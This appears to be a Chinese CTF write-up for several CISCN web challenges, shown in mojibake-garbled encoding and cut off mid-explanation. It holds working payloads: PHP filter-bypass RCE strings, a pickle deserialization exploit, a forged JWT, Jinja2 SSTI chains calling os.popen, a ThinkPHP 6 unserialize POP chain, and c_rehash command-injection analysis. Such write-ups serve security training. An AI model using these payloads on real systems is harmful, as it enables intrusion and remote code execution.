?c=($pi=base_convert)(696468,10,36)($pi(76478043844,9,34)(dechex(109270211257898))) //exec('hex2bin(dechex(109270211257898))') =&gt; exec('cat f*') è¿™é‡Œå‘ç°ä¸€ä¸ªé—®é¢˜ï¼Œè¿™ä¸ªpayloadè¶…è¿‡äº†80çš„é•¿åº¦é™åˆ¶ï¼Œæ‰€ä»¥åªèƒ½æ¢è¿›åˆ¶ï¼Œæœ€ç»ˆå¦‚ä¸‹ï¼ˆä½†æµ‹è¯•ä¹‹åä¸æˆåŠŸï¼Ÿï¼Ÿï¼‰ /index.php?c=($pi=base_convert)(22950,23,34)($pi(76478043844,9,34)(dechex(109270211257898))) //åˆ†æï¼šexec('hex2bin(dechex(109270211257898))') =&gt; exec('cat f*') /index.php?c=base_convert(1751504350,10,36)(base_convert(15941,10,36).(dechex(16)^asinh^pi)) //åˆ†æï¼šsystem('cat'.dechex(16)^asinh^pi) =&gt; system('cat *') æ–¹æ³•å››ï¼š å‰é¢éƒ½æ˜¯åˆ©ç”¨ç™½åå•çš„æ•°å­¦å‡½æ•°å°†æ•°å­—è½¬æˆå­—ç¬¦ä¸²ï¼Œå…¶å®ä¹Ÿå¯ä»¥å¼‚æˆ–æ„é€ è¿™æ˜¯fuzzè„šæœ¬ &lt;?php $payload=['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh']; for($k=1;$k&lt;=sizeof($payload);$k++){ for($i=0;$i&lt;9; $i++){ for($j=0;$j&lt;=9;$j++){ $exp=$payload[$k] ^$i.$j; echo($payload[$k].\"^$i$j\".\"==&gt;$exp\"); echo\"&lt;br /&gt;\"; } } } å¾—åˆ°is_nan^64==&gt;_Gå’Œtan^15==&gt;ET payload: ?c=$pi=(is_nan^(6).(4)).(tan^(1).(5));$pi=$$pi;$pi{0}($pi{1})&amp;0=system&amp;1=cat flag.php //$pi=_GET;$pi=$_GET;$_GET[0]($_GET[1])&amp;0=system&amp;1=cat flag.php ==&gt; system(cat flag.php) [CISCN 2019ååŒ—Day1]Web2 é¦–å…ˆæ˜¯ä¸€ä¸ªè„šæœ¬çˆ†ç ´ é¦–é¡µå‘Šè¯‰æˆ‘ä»¬è¦å–åˆ°lv6ï¼Œé‚£æˆ‘ä»¬é¦–å…ˆå¾—æ‰¾åˆ°å®ƒï¼Œç”±äºé¡µé¢å¾ˆå¤šï¼Œæ‰‹åŠ¨ä¸ç°å®ï¼Œæ•…æ­¤éœ€è¦è„šæœ¬æ‰¾ import requests import time for i in range(0, 2000): time.sleep(0.5) url = 'http://dfb21cdf-d431-4926-b0fa-b5d1905ac641.node4.buuoj.cn:81/shop?page={}'.format(i) res = requests.get(url) if 'lv6.png' in res.text: print(\"æ‰¾åˆ°lv6----{}\".format(i)) å¦‚ä¸Šå›¾åœ¨181é¡µï¼Œæˆ‘ä»¬è®¿é—®çœ‹çœ‹ï¼Œæˆ‘ä»¬åœ¨ç»“ç®—çš„æ—¶å€™æŠ“åŒ…çœ‹çœ‹ å¦‚ä¸Šå›¾æˆ‘ä»¬ä¿®æ”¹æŠ˜æ‰£è¿›è¡Œè´­ä¹°ï¼Œéšåçœ‹åˆ°å³ä¾§æœ‰ä¸ªé‡å®šå‘ï¼Œæˆ‘ä»¬è®¿é—®çœ‹çœ‹b1g_m4mber çœ‹åˆ°è¿™é‡Œåªå…è®¸adminè®¿é—®ï¼Œåˆçœ‹åˆ°å…¶ä¸­æœ‰jwtï¼Œé‚£æ¯«æ— ç–‘é—®å°±æ˜¯ä¼ªé€ jtwäº†ï¼Œé‚£é¦–å…ˆæˆ‘ä»¬å…ˆè¦æ‹¿åˆ°secretï¼Œè¿™é‡Œä¹Ÿæ˜¯çœ‹wpå‘ç°æ˜¯é€šè¿‡çˆ†ç ´æ‰¾åˆ°secretçš„ï¼Œç›´æ¥ä¸Šå·¥å…·ï¼š githubé“¾æ¥https://github.com/brendan-rius/c-jwt-cracker ç”¨æ³•è¿™é‡Œå°±ä¸èµ˜è¿°äº†ï¼Œå¦‚ä¸Šå›¾å¯ä»¥çœ‹åˆ°secretæ˜¯1Kun å¦‚ä¸Šå›¾è¿›è¡Œä¼ªé€ ä¹‹åå‘é€åˆ°bpï¼š eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.sxEqhTA_xPDDL_4t8tiMNUIALRjMHxFOsKkzUOc1MPA å‘é€ä¹‹åæ˜¯å¦‚ä¸‹é¡µé¢ï¼š æˆåŠŸä»¥adminèº«ä»½ç™»å½•ï¼Œæ¥ä¸‹æ¥çœ‹ä¸€ä¸‹æºä»£ç å‘ç°å­˜åœ¨www.zipæˆ‘ä»¬ä¸‹è½½çœ‹çœ‹ å¦‚æœæˆ‘ä»¬ä¸Šè¿°æˆåŠŸçš„è¯ï¼Œå°±ä¼šå¾—åˆ°æºç ï¼Œæˆ‘ä»¬æ‰¾åˆ°Admin.pyçœ‹åˆ°å¦‚ä¸‹ä»£ç  import tornado.web from sshop.base import BaseHandler import pickle import urllib class AdminHandler(BaseHandler): @tornado.web.authenticated def get(self, *args, **kwargs): if self.current_user == \"admin\": return self.render('form.html', res='This is Black Technology!', member=0) else: return self.render('no_ass.html') @tornado.web.authenticated def post(self, *args, **kwargs): try: become = self.get_argument('become') p = pickle.loads(urllib.unquote(become)) return self.render('form.html', res=p, member=1) except: return self.render('form.html', res='This is Black Technology!', member=0) åˆ†æå¯ä»¥çŸ¥é“ï¼Œåªæœ‰æˆ‘ä»¬ç”¨æˆ·ä¸ºadminï¼Œéšåå‘becomeè¿›è¡Œä¼ å‚ï¼Œå†…å®¹ä¸ºåºåˆ—åŒ–å†…å®¹ä¹‹åç”±äºrenderçš„å­˜åœ¨ï¼Œæˆ‘ä»¬å¯ä»¥æ‰§è¡Œæ¶æ„ä»£ç ï¼Œpayloadå¦‚ä¸‹ import pickle import urllib class pop(object): def __reduce__(self): return(eval, (\"open('/flag.txt', 'r').read()\", )) poc = pop() s = pickle.dumps(poc) print(urllib.qoute(s))#æ³¨æ„ä¸Šè¿°é¢˜ç›®ä¸­çš„på‚æ•°æ˜¯ç»è¿‡urllib.unquoteå‡½æ•°å¤„ç†çš„ ä¹‹ååœ¨python2ç¯å¢ƒä¸‹è¿è¡Œï¼Œå‘becomeä¼ å‚å³å¯ è¿™é‡Œç‚¹å‡»é¡µé¢çš„ä¸€é”®æˆä¸ºå¤§ä¼šå‘˜ä¹‹åæŠ“åŒ…ï¼Œä¿®æ”¹becomeå‚æ•°ï¼Œæ‹¿åˆ°flag [CISCN 2019åä¸œå—]Web4 é¦–é¡µå‘ç°å­˜åœ¨ssrfï¼Œå°è¯•å‡ æ¬¡å‘ç°fileè¢«banï¼Œçœ‹äº†wpçŸ¥é“è¿˜æœ‰local_fileå¯ä»¥ç”¨ï¼Œç›´æ¥è¯»å–æºä»£ç /app/app.py # encoding:utf-8 import re, random, uuid, urllib from flask import Flask, session, request app = Flask(__name__) random.seed(uuid.getnode()) app.config['SECRET_KEY'] = str(random.random()*233) app.debug = True @app.route('/') def index(): session['username'] = 'www-data' return 'Hello World! &lt;a href=\"/read?url=https://baidu.com\"&gt;Read somethings&lt;/a&gt;' @app.route('/read') def read(): try: url = request.args.get('url') m = re.findall('^file.*', url, re.IGNORECASE) n = re.findall('flag', url, re.IGNORECASE) if m or n: return 'No Hack' res = urllib.urlopen(url) return res.read() except Exception as ex: print str(ex) return 'no response' @app.route('/flag') def flag(): if session and session['username'] == 'fuck': return open('/flag.txt').read() else: return 'Access denied' if __name__=='__main__': app.run( debug=True, host=\"0.0.0.0\" ) çœ‹ä»£ç çŸ¥é“å°†fileã€flagç»™banäº†ï¼Œä½†å¦‚æœæˆ‘ä»¬è®¿é—®flagè·¯ç”±çš„æ—¶å€™ï¼Œå­˜åœ¨sessionä¸”å…¶ä¸­çš„usernameçš„é”®å€¼ä¸ºfuckï¼Œå³å¯æˆåŠŸè¯»å–flag åŒæ—¶é¡µé¢æŠ“åŒ…å‘ç°è¿™æ˜¯python2ï¼Œè¿™æ—¶å€™åªéœ€è¦é‡ç‚¹çœ‹ä¸€ä¸‹session-keyæ˜¯å¦‚ä½•ç”Ÿæˆçš„ï¼š random.seed(uuid.getnode()) app.config['SECRET_KEY'] = str(random.random()*233) æŸ¥è¯¢ä¸€ç•ªå‘ç°è¿™é‡Œçš„uuidå‡½æ•°æ˜¯ç”¨æ¥è·å–Macåœ°å€çš„ï¼Œå¹¶å°†å…¶å½“åšéšæœºæ•°ç§å­æ¥ç”Ÿæˆkeyï¼Œé‚£æˆ‘ä»¬å…ˆè¯»å–ä¸€ä¸‹Macåœ°å€æ˜¯ä»€ä¹ˆ local_file:///sys/class/net/eth0/address å¾—åˆ°ä¹‹åå¸¦å…¥ä¸Šè¿°ç”Ÿæˆçš„keyï¼Œå¹¶ç”¨py2è¿è¡Œï¼Œæ‹¿åˆ°key æ¥ç€ä½¿ç”¨è„šæœ¬è§£å¯†sessionå³å¯ æœ€åå°†åŠ å¯†åçš„ç»“æœä¿®æ”¹è¿›cookieå³å¯ [CISCN 2019åä¸œå—]Double Secret æ‰«å‡ºä¸‰ä¸ªç›®å½•ï¼Œä¸€ä¸ªä¸ªè¯•äº†ï¼Œå°±å¦‚ä¸‹é¡µé¢æœ‰ç‚¹ç”¨ï¼Œå‘ç°æœ‰æŠ¥é”™ï¼Œä½†è¿™é‡Œä¸çŸ¥é“ä¸ºä½•æˆ‘ä¸èƒ½çœ‹æŠ¥é”™ä»£ç ã€‚ã€‚ã€‚ ç›´æ¥å€Ÿç”¨wpçš„äº† if(secret==None): return 'Tell me your secret.I will encrypt it so others can\\'t see' rc=rc4_Modified.RC4(\"HereIsTreasure\") #è§£å¯† deS=rc.do_crypt(secret) a=render_template_string(safe(deS)) if 'ciscn' in a.lower(): return 'flag detected!' return a è¿™é‡Œå¯¹secretå†…å®¹è¿›è¡Œrc4è§£å¯†ï¼Œéšåå¯¹deSè¿›è¡Œæ¨¡æ¿æ¸²æŸ“ï¼Œå…¶ä¸­è¿˜æœ‰ä¸€ä¸ªsafeä¼¼ä¹æ˜¯è¿‡æ»¤å‡½æ•°ï¼Œæ”¾ä¸€ä¸ªrc4åŠ å¯†è„šæœ¬ import base64 from urllib.parse import quote def rc4_main(key = \"init_key\", message = \"init_message\"): # print(\"RC4åŠ å¯†ä¸»å‡½æ•°\") s_box = rc4_init_sbox(key) crypt = str(rc4_excrypt(message, s_box)) return crypt def rc4_init_sbox(key): s_box = list(range(256)) # æˆ‘è¿™é‡Œæ²¡ç®¡ç§˜é’¥å°äº256çš„æƒ…å†µï¼Œå°äº256ä¸æ–­é‡å¤å¡«å……å³å¯ # print(\"åŸæ¥çš„ s ç›’ï¼š%s\" % s_box) j = 0 for i in range(256): j = (j + s_box[i] + ord(key[i % len(key)])) % 256 s_box[i], s_box[j] = s_box[j], s_box[i] # print(\"æ··ä¹±åçš„ s ç›’ï¼š%s\"% s_box) return s_box def rc4_excrypt(plain, box): # print(\"è°ƒç”¨åŠ å¯†ç¨‹åºæˆåŠŸã€‚\") res = [] i = j = 0 for s in plain: i = (i + 1) % 256 j = (j + box[i]) % 256 box[i], box[j] = box[j], box[i] t = (box[i] + box[j]) % 256 k = box[t] res.append(chr(ord(s) ^ k)) # print(\"resç”¨äºåŠ å¯†å­—ç¬¦ä¸²ï¼ŒåŠ å¯†åæ˜¯ï¼š%res\" %res) cipher = \"\".join(res) print(\"åŠ å¯†åçš„å­—ç¬¦ä¸²æ˜¯ï¼š%s\" %quote(cipher)) #print(\"åŠ å¯†åçš„è¾“å‡º(ç»è¿‡ç¼–ç ):\") #print(str(base64.b64encode(cipher.encode('utf-8')), 'utf-8')) return (str(base64.b64encode(cipher.encode('utf-8')), 'utf-8')) #éœ€è¦åŠ å¯†çš„å­—ç¬¦ä¸²åœ¨è¿™é‡Œä¿®æ”¹ rc4_main(\"HereIsTreasure\",\"{{''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__.__builtins__.__import__('os').popen('cat /flag.txt').read()}}\") è¿™é‡Œæœ‰ä½¬è¯´æ˜ï¼šè¿™é‡Œæ˜¯åç«¯å¯¹secretä¼ å…¥çš„å€¼è¿›è¡Œäº†RC4åŠ å¯†ï¼ŒRC4åŠ å¯†æ–¹å¼ä¸ºï¼Œæ˜æ–‡åŠ å¯†ä¸€æ¬¡å¾—åˆ°å¯†æ–‡ï¼Œå¯†æ–‡åœ¨åŠ å¯†ä¸€æ¬¡å¾—åˆ°æ˜æ–‡ã€‚æ‰€ä»¥è¦ä½¿ç”¨RC4è„šæœ¬å¯¹æˆ‘ä»¬ä¼ å…¥çš„æ¶æ„å­—ç¬¦ä¸²è¿›è¡Œä¸€æ¬¡åŠ å¯†ï¼Œè¿™æ ·ä¼ ç»™ç³»ç»Ÿï¼Œæ—¢ç»•è¿‡æ£€æµ‹ï¼ŒåŒæ—¶è¿˜å¾—åˆ°äº†æ˜æ–‡å¾—ä»¥æ‰§è¡Œ ä¸è¿‡è¿™é“é¢˜ä¼¼ä¹ç›´æ¥ç”¨ä¸Šè¿°çš„sstiç›´æ¥è¯»å–flagå³å¯ rc4_main(\"HereIsTreasure\",\"{{''.__class__.__mro__[2].__subclasses__()}}\") ä¸‹æ ‡ä¸º59çš„æ˜¯warnings.catch_warningsï¼Œç›´æ¥åˆ©ç”¨å³å¯ï¼š rc4_main(\"HereIsTreasure\",\"{{''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__.__builtins__.__import__('os').popen('cat /flag.txt').read()}}\") çœ‹äº†wpå‘ç°ï¼Œå¯ä»¥é€šè¿‡æ‰§è¡Œpyä»£ç ç›´æ¥ä¸€æ­¥åˆ°ä½ï¼š {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval(\"__import__('os').popen('ls /').read()\")}}{% endif %}{% endfor %} æ‰¾åˆ°äº†flagä½ç½®ï¼Œéšåè¯»å–ï¼š {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval(\"__import__('os').popen('cat /flag.txt').read()\")}}{% endif %}{% endfor %} [CISCN 2022 åˆèµ›]ezpop è¿™é“é¢˜å…ˆæ˜¯ä¸€ä¸ªæºç æ³„éœ²ï¼Œwww.zipæ¥ç€æˆ‘ä»¬æ‰“å¼€ä¹‹åï¼Œçœ‹åˆ°å¦‚ä¸‹è·¯ç”±ï¼šapp/controller/index.php &lt;?php namespace app\\controller; use app\\BaseController; class Index extends BaseController { public function index() { return '&lt;style type=\"text/css\"&gt;*{ padding: 0; margin: 0; } div{ padding: 4px 48px;} a{color:#2E5CD5;cursor: pointer;text-decoration: none} a:hover{text-decoration:underline; } body{ background: #fff; font-family: \"Century Gothic\",\"Microsoft yahei\"; color: #333;font-size:18px;} h1{ font-size: 100px; font-weight: normal; margin-bottom: 12px; } p{ line-height: 1.6em; font-size: 42px }&lt;/style&gt;&lt;div style=\"padding: 24px 48px;\"&gt; &lt;h1&gt;:) &lt;/h1&gt;&lt;p&gt; ThinkPHP V' . \\think\\facade\\App::version() . '&lt;br/&gt;&lt;span style=\"font-size:30px;\"&gt;14è½½åˆå¿ƒä¸æ”¹ - ä½ å€¼å¾—ä¿¡èµ–çš„PHPæ¡†æ¶&lt;/span&gt;&lt;/p&gt;&lt;span style=\"font-size:25px;\"&gt;[ V6.0 ç‰ˆæœ¬ç”± &lt;a href=\"https://www.yisu.com/\" target=\"yisu\"&gt;äº¿é€Ÿäº‘&lt;/a&gt; ç‹¬å®¶èµåŠ©å‘å¸ƒ ]&lt;/span&gt;&lt;/div&gt;&lt;script type=\"text/javascript\" src=\"https://tajs.qq.com/stats?sId=64890268\" charset=\"UTF-8\"&gt;&lt;/script&gt;&lt;script type=\"text/javascript\" src=\"https://e.topthink.com/Public/static/client.js\"&gt;&lt;/script&gt;&lt;think id=\"ee9b1aa918103c4fc\"&gt;&lt;/think&gt;'; } public function hello($name = 'ThinkPHP6') { return 'hello,' . $name; } public function test() { unserialize($_POST['a']); } } å¯ä»¥çœ‹åˆ°è¿™é‡Œæœ‰ååºåˆ—åŒ–å…¥å£ç‚¹ï¼ŒåŠ ä¸Šå¦‚ä¸‹å›¾ï¼Œç›´æ¥æš´éœ²äº†ç‰ˆæœ¬ï¼Œé‚£ä¸Šç½‘æ‰¾ç°æˆçš„popå³å¯ &lt;?php namespace think{ abstract class Model{ private $lazySave = false; private $data = []; private $exists = false; protected $table; private $withAttr = []; protected $json = []; protected $jsonAssoc = false; function __construct($obj = ''){ $this-&gt;lazySave = True; $this-&gt;data = ['whoami' =&gt; ['ls /']]; $this-&gt;exists = True; $this-&gt;table = $obj; $this-&gt;withAttr = ['whoami' =&gt; ['system']]; $this-&gt;json = ['whoami',['whoami']]; $this-&gt;jsonAssoc = True; } } } namespace think\\model{ use think\\Model; class Pivot extends Model{ } } namespace{ echo(urlencode(serialize(new think\\model\\Pivot(new think\\model\\Pivot())))); } æ ¹æ®æ–‡ç« æ‰€è¯´ä»¥åŠä»£ç ï¼Œæˆ‘ä»¬æ‰¾åˆ°index.php/index/testä¸‹ç›´æ¥postä¼ å…¥å‚æ•°aå³å¯ å‚è€ƒæ–‡ç«  ThinkPHP6.0.12LTSååºåˆ—æ¼æ´åˆ†æ ThinkPHP 6.0.12 Unserialize RCE [CISCN 2022 åˆèµ›]online_crt è·Ÿç€é™„ä»¶æˆ‘ä»¬çœ‹åˆ°åç«¯æ˜¯ç”±Pythonå’Œgolangå¤„ç†çš„ï¼Œå…ˆçœ‹python def get_crt(Country, Province, City, OrganizationalName, CommonName, EmailAddress): root_key = rsa.generate_private_key( public_exponent=65537, key_size=2048, backend=default_backend() ) subject = issuer = x509.Name([ x509.NameAttribute(NameOID.COUNTRY_NAME, Country), x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, Province), x509.NameAttribute(NameOID.LOCALITY_NAME, City), x509.NameAttribute(NameOID.ORGANIZATION_NAME, OrganizationalName), x509.NameAttribute(NameOID.COMMON_NAME, CommonName), x509.NameAttribute(NameOID.EMAIL_ADDRESS, EmailAddress), ]) root_cert = x509.CertificateBuilder().subject_name( subject ).issuer_name( issuer ).public_key( root_key.public_key() ).serial_number( x509.random_serial_number() ).not_valid_before( datetime.datetime.utcnow() ).not_valid_after( datetime.datetime.utcnow() + datetime.timedelta(days=3650) ).sign(root_key, hashes.SHA256(), default_backend()) crt_name = \"static/crt/\" + str(uuid.uuid4()) + \".crt\" with open(crt_name, \"wb\") as f: f.write(root_cert.public_bytes(serialization.Encoding.PEM)) return crt_name ä¸Šè¿°ä»£ç æ˜¯ç”¨æ¥ç”Ÿæˆcrtè¯ä¹¦çš„ @app.route('/getcrt', methods=['GET', 'POST']) def upload(): Country = request.form.get(\"Country\", \"CN\") Province = request.form.get(\"Province\", \"a\") City = request.form.get(\"City\", \"a\") OrganizationalName = request.form.get(\"OrganizationalName\", \"a\") CommonName = request.form.get(\"CommonName\", \"a\") EmailAddress = request.form.get(\"EmailAddress\", \"a\") return get_crt(Country, Province, City, OrganizationalName, CommonName, EmailAddress) è¿™é‡Œæ˜¯ç”¨æ¥å¤„ç†getcrtè·¯ç”±ä¸‹çš„getå’Œpostæ–¹æ³•ï¼Œåœ¨uploadå‡½æ•°ä¸­é€šè¿‡request.form.getæå–formè¡¨å•ä¸­æŒ‡å®šå‚æ•°çš„å†…å®¹ï¼Œå¦‚æœæ²¡æœ‰çš„è¯ï¼Œåˆ™æŒ‰é»˜è®¤çš„æ¥ã€‚æœ€åè°ƒç”¨get_crtå‡½æ•°ç”Ÿæˆè¯ä¹¦ @app.route('/createlink', methods=['GET']) def info(): json_data = {\"info\": os.popen(\"c_rehash static/crt/ &amp;&amp; ls static/crt/\").read()} return json.dumps(json_data) å½“è®¿é—®createlinkè·¯ç”±æ—¶ï¼Œä¼šè°ƒç”¨popenå‡½æ•°æ‰§è¡Œc_rehash static/crt/ &amp;&amp; ls static/crt/ï¼Œå¹¶æœ€ç»ˆå°†å¾—åˆ°çš„ç»“æœæŒ‰jsonæ•°æ®æ ¼å¼è¿”å› @app.route('/proxy', methods=['GET']) def proxy(): uri = request.form.get(\"uri\", \"/\") client = socket.socket() client.connect(('localhost', 8887)) msg = f'''GET {uri} HTTP/1.1 Host: test_api_host User-Agent: Guest Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close ''' client.send(msg.encode()) data = client.recv(2048) client.close() return data.decode() è¿™é‡Œç›®çš„æ˜¯ä¸ç›®æ ‡æœåŠ¡å™¨localhost:8887å»ºç«‹è¿æ¥ï¼Œåœ¨æƒ³ç›®æ ‡æœåŠ¡å™¨å‘é€httpè¯·æ±‚ä¹‹åï¼Œè¿”å›ç›®æ ‡æœåŠ¡å™¨çš„å“åº” æ¥ç€æˆ‘ä»¬çœ‹ä¸€ä¸‹goçš„ä»£ç  func admin(c *gin.Context) { staticPath := \"/app/static/crt/\" oldname := c.DefaultQuery(\"oldname\", \"\") newname := c.DefaultQuery(\"newname\", \"\") if oldname == \"\" || newname == \"\" || strings.Contains(oldname, \"..\") || strings.Contains(newname, \"..\") { c.String(500, \"error\") return } if c.Request.URL.RawPath != \"\" &amp;&amp; c.Request.Host == \"admin\" { err := os.Rename(staticPath+oldname, staticPath+newname) if err != nil { return } c.String(200, newname) return } c.String(200, \"no\") } func index(c *gin.Context) { c.String(200, \"hello world\") } func main() { router := gin.Default() router.GET(\"/\", index) router.GET(\"/admin/rename\", admin) if err := router.Run(\":8887\"); err != nil { panic(err) } } é¦–å…ˆåœ¨mainå‡½æ•°ä¸­ã€‚å¦‚æœè®¿é—®/è·¯ç”±ï¼Œåˆ™è°ƒç”¨indexå‡½æ•°ï¼›å¦‚æœè®¿é—®/admin/renameï¼Œåˆ™è°ƒç”¨adminå‡½æ•° å…¶ä¸­indexå‡½æ•°å°±å•çº¯è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ï¼›adminå‡½æ•°ä¸­é¦–å…ˆè·å–æ—§çš„ä»¥åŠæ–°çš„åå­—ï¼Œéšååˆ¤æ–­å…¶æ˜¯å¦ä¸ºç©ºä¸”å­—ç¬¦ä¸²ä¸­æ˜¯å¦åŒ…å«..é˜²æ­¢ç›®å½•ç©¿è¶Šï¼›å¦‚æœæ­£å¸¸çš„è¯ï¼Œæ¥ç€åˆ¤æ–­urlè·¯å¾„å¦‚æœä¸æ˜¯ç©ºï¼Œä¸”hostä¸ºadminåˆ™æˆåŠŸæ‰§è¡Œrenameè¿›è¡Œåå­—çš„æ›´æ›¿ã€‚ é¢˜ç›®ä¸­å‡ºç°äº† c_rehashï¼Œc_rehashæ˜¯opensslä¸­çš„ä¸€ä¸ªç”¨perlç¼–å†™çš„è„šæœ¬å·¥å…·ï¼Œç”¨äºæ‰¹é‡åˆ›å»ºè¯ä¹¦ç­‰æ–‡ä»¶ hashå‘½åçš„ç¬¦å·é“¾æ¥ï¼Œc_rehash æœ‰ä¸ªå‘½ä»¤æ³¨å…¥æ¼æ´ (CVE-2022-1292)ï¼Œç»è¿‡æœç´¢ç½‘ä¸Šå¹¶æ²¡æœ‰å…¬å¼€çš„exp (å¯èƒ½å› ä¸ºè¿™ä¸ªæ¼æ´éå¸¸é¸¡è‚‹)ï¼Œåªèƒ½é€šè¿‡diffè¿›è¡Œåˆ†æ è¿™é‡Œçœ‹ä¸æ‡‚ä»£ç ï¼Œçœ‹äº†wpä¹‹åè¯´è¿™é‡Œçš„fnameæ²¡æœ‰è¿›è¡Œè¿‡æ»¤åå¼•å·å°±ç›´æ¥æ‹¼æ¥åˆ°äº†ä¸Šè¿°ç®­å¤´å¤„çš„å‘½ä»¤ä¸­ï¼Œè¿™æ„å‘³ç€å¦‚æœæˆ‘ä»¬æ„é€ ä¸€ä¸ªå«æœ‰åå¼•å·çš„æ–‡ä»¶åï¼Œå³å¯è¿›è¡Œrceã€‚ æ ¹æ®ä¸Šè¿°çš„åˆ†æä»¥åŠwpæˆ‘ä»¬å¯ä»¥æœ‰ä¸ªæ€è·¯ï¼Œé¦–å…ˆå°±æ˜¯è®¿é—®/getcrtè·å–è¯ä¹¦ä»¥åŠæ–‡ä»¶åï¼Œéšåå°±æ˜¯è¦æ„é€ æˆ‘ä»¬éœ€è¦è¿›è¡Œrceçš„æ–‡ä»¶åäº†ï¼Œå¦‚æœæ„é€ å¥½å¹¶æˆåŠŸæ‰§è¡Œadminå‡½æ•°ä¹‹åï¼Œæˆ‘ä»¬ç›´æ¥è®¿é—®createlinkè·¯ç”±ï¼Œå…¶ä¸­infoå‡½æ•°ä¼šé€šè¿‡popenæ‰§è¡Œæˆ‘ä»¬çš„æ–‡ä»¶åï¼Œé€ æˆrceï¼ˆ c_rehash ä½œç”¨æ˜¯è®©opensslåœ¨è¯ä¹¦ç›®å½•ä¸­èƒ½å¤Ÿæ‰¾åˆ°è¯ä¹¦ï¼‰ sub hash_dir { my %hashlist; print \"Doing $_[0] \"; #å°†å½“å‰ç›®å½•åˆ‡æ¢åˆ°å‚æ•° $_[0] æŒ‡å®šçš„ç›®å½•ã€‚ chdir $_[0]; #ä½¿ç”¨ opendir æ‰“å¼€ç›®å½•ï¼Œå¹¶è¯»å–è¯¥ç›®å½•ä¸‹çš„æ–‡ä»¶åˆ—è¡¨ï¼Œä½¿ç”¨ readdir è·å–æ–‡ä»¶åˆ—è¡¨å¹¶æŒ‰å­—æ¯é¡ºåºæ’åº opendir(DIR, \".\"); my @flist = sort readdir(DIR); closedir DIR; #å¦‚æœ $removelinks å˜é‡ä¸ºçœŸï¼Œåˆ™åˆ é™¤ç¬¦å·é“¾æ¥æ–‡ä»¶ã€‚ if ( $removelinks ) { # Delete any existing symbolic links foreach (grep {/^[\\da-f]+\\.r{0,1}\\d+$/} @flist) { if (-l $_) { print \"unlink $_\" if $verbose; unlink $_ || warn \"Can't unlink $_, $! \"; } } } #å¯¹äºç¬¦åˆç‰¹å®šæ–‡ä»¶åæ¨¡å¼ï¼ˆä»¥ .pemã€.crtã€.cerã€.crl ç»“å°¾ï¼‰çš„æ–‡ä»¶ï¼Œè°ƒç”¨ check_file å­ä¾‹ç¨‹æ£€æŸ¥æ–‡ä»¶å†…å®¹æ˜¯å¦ç¬¦åˆè¯ä¹¦æˆ– CRL æ ¼å¼ã€‚ FILE: foreach $fname (grep {/\\.(pem)|(crt)|(cer)|(crl)$/} @flist) { # Check to see if certificates and/or CRLs present. my ($cert, $crl) = check_file($fname); if (!$cert &amp;&amp; !$crl) { print STDERR \"WARNING: $fname does not contain a certificate or CRL: skipping \"; next; } link_hash_cert($fname) if ($cert);#å¦‚æœæ–‡ä»¶åŒ…å«è¯ä¹¦ï¼Œåˆ™è°ƒç”¨ link_hash_cert å­ä¾‹ç¨‹å¤„ç†è¯ä¹¦ã€‚ link_hash_crl($fname) if ($crl);#å¦‚æœæ–‡ä»¶åŒ…å« CRLï¼Œåˆ™è°ƒç”¨ link_hash_crl å­ä¾‹ç¨‹å¤„ç† CRLã€‚ } } åˆ©ç”¨æ¡ä»¶ æ‰§è¡Œc_rehash ç›®æ ‡ç›®å½•ä¸‹æ–‡ä»¶å¯æ§ æ–‡ä»¶åç¼€ç¬¦åˆè¦æ±‚ æ–‡ä»¶å†…å®¹å¿…é¡»åŒ…å«è¯ä¹¦æˆ–è€…æ˜¯åŠé”€åˆ—è¡¨ æ–‡ä»¶åå¯æ§ é¢˜ç›®ä¸­ç”Ÿæˆè¯ä¹¦çš„åŠŸèƒ½å¯ä»¥åˆ›å»ºä¸€ä¸ªæ»¡è¶³è¦æ±‚çš„æ–‡ä»¶ è¿™é‡Œè¦å®ç°æ–‡ä»¶åå¯æ§ï¼Œé‡ç‚¹å°±æ˜¯goä¸­çš„renameå‡½æ•°äº†ï¼Œè¦è°ƒç”¨è¯¥å‡½æ•°ï¼Œé¦–å…ˆéœ€è¦ç»•è¿‡ if c.Request.URL.RawPath != \"\" &amp;&amp; c.Request.Host == \"admin\" è¿™é‡Œå…ˆçœ‹ä¸€ä¸ªgoè¯­è¨€URI.URLç»“æ„ä½“ï¼ˆæ‰¾ä¸åˆ°åŸæ–‡ç« ï¼Œå€Ÿç”¨å¸ˆå‚…çš„å›¾äº†ï¼‰ ä¹Ÿå°±æ˜¯è¯´urlä¸­å¿…é¡»å«æœ‰å¾…è½¬ç§»çš„å­—ç¬¦ï¼Œä¹Ÿå°±æ˜¯ç»è¿‡urlç¼–ç çš„å­—ç¬¦ï¼Œå…·ä½“ä¹Ÿå¯å‚è€ƒè¯¥æ–‡ç« è§£é‡Š æ¥ä¸‹æ¥å…ˆè®¿é—®getcrtè·å–è¯ä¹¦æ–‡ä»¶åï¼šstatic/crt/39d205a5-79c2-4f06-936c-8adb7f06c6b2.crt æ¥ç€è¯·æ±‚ /proxy ä¿®æ”¹è¯ä¹¦åä¸ºæ¶æ„æ–‡ä»¶åï¼Œè¿™é‡Œæ”¾ä¸€äº›å¸ˆå‚…ä»¬è¯´çš„å‘ç‚¹ï¼š 